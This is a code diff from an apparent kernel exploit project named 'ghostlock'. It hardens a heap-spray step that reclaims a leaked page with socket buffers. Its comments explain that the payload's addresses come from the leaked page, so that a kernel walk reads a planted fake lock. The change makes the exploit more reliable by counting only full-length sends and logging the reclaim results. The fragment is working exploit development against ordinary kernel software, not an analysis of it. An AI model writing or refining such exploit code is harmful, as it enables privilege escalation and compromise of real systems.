@@ -826,14 +826,35 @@ namespace ghostlock::support {
             prepare_ctx.memfds[i] = -1;
             kill_child(prepare_ctx.childs[i]);
         }
+        int32_t reclaim_ok = 0;
+        int32_t reclaim_errno = 0;
         for (int32_t i = 0; i < kernel::SKB_RECLAIM_SENDS; i++) {
             spray_breadcrumb("step6 reclaim-sends");
             errno = 0;
             ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
-            if (sent <= 0) {
+            /* A short datagram still queues an skb, but not one that covers the
+             * leaked page, so only a full-length send counts as a reclaim. */
+            if (sent != static_cast<ssize_t>(kernel::SKB_SEND_SIZE)) {
+                reclaim_errno = (sent < 0) ? errno : -1;
                 break;
             }
+            reclaim_ok++;
         }
+        /* The craft's addresses are baked from the leaked page, so the payload
+         * only lands where the walk will look if the reclaim sends actually
+         * queued an skb on that page. A short send leaves the page in the buddy
+         * allocator and the walk then reads a fake lock nobody wrote. */
+        {
+            char line[64];
+            const int32_t n = snprintf(line, sizeof(line), "step6 done ok=%d errno=%d",
+                                       reclaim_ok, reclaim_errno);
+            if (n > 0) {
+                spray_breadcrumb(line);
+            }
+        }
+        pr_info("[spray] reclaim sends ok=%d/%d errno=%d +%lldms\n", reclaim_ok,
+                static_cast<int32_t>(kernel::SKB_RECLAIM_SENDS), reclaim_errno,
+                ms_since(&t_spray));
         pr_info("[spray] payload ready +%lldms\n", ms_since(&t_spray));
         spray_breadcrumb("step7 spray-done");
         snitch.reset();
